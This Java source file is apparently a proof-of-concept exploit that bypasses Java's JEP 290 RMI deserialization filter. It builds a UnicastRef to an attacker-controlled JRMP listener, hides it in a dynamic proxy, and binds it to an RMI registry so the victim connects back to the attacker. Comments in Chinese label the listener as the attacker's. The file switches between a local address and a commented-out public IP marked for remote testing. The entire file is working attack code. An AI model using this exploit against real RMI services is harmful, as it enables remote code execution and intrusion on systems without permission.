package com.lala;

import sun.rmi.server.UnicastRef;

import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RemoteRef;

public class Bypass290_proxy {
    public static class PocHandler implements InvocationHandler, Serializable {
        private RemoteRef ref;

        protected PocHandler(RemoteRef newref) {
            ref = newref;
        }


        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            return this.ref;
        }
    }

    //让受害者主动去连接的攻击者的JRMPlister的host和port
    public static UnicastRef generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }

    public static void main(String[] args) throws Exception{
//        String jrmpListenerHost = "47.102.137.160";//远程测试
        String jrmpListenerHost = "127.0.0.1";//本地测试
        int jrmpListenerPort = 1199;
        UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
        Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class<?>[]{Remote.class}, new PocHandler(unicastRef));
        Registry registry = LocateRegistry.getRegistry(1099);//本地测试
//        Registry registry = LocateRegistry.getRegistry("47.102.137.160",1099);//远程测试
        registry.bind("2333", remote);
    }
}
